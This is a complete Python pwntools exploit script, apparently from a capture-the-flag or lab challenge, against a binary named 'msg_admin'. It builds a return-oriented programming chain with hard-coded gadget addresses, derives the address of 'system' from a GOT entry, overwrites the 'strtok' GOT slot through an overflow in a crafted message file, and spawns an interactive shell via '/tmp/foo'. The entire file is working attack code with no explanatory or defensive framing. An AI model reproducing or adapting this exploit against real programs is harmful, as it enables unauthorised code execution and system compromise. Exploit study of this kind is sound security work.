#!/usr/bin/python3
from pwn import process, p32, write, os

def add(addr):
    rop  = b""
    rop += p32(0x0804859d)       # pop ebx; ret;
    rop += p32(addr - 0x1270304)
    rop += p32(0x08048feb)       # add eax, dword ptr [ebx + 0x1270304]; ret;
    return rop

rop  = b""
rop += p32(0x8048790) # mov eax, 0x804b074; sub eax, 0x804b074;
rop += add(0x804b04c) # atol@got + 0xe900 = system
rop += add(0x80484b3) # 0xe100
rop += add(0x804652b) # 0x800
rop += p32(0x8048786) # call eax;
rop += p32(0x8048eef) # "/tmp/foo"

payload  = b""
payload += b"A" * 10
payload += b"|"
payload += rop
payload += b"B" * (212 - len(rop))
payload += p32(0x804b05c) # strtok@got
payload += b"\n"
payload += p32(0x8048ddc) # pop ebx; pop esi; pop edi; pop ebp; ret;
payload += b"|"
payload += b"D" * 10
payload += b"\n"

write("exploit.msg", payload)
write("/tmp/foo", "/bin/sh")
os.chmod("/tmp/foo", 0o755)

shell = process(["./msg_admin", "1", "exploit.msg"])
shell.recvline()
shell.interactive()
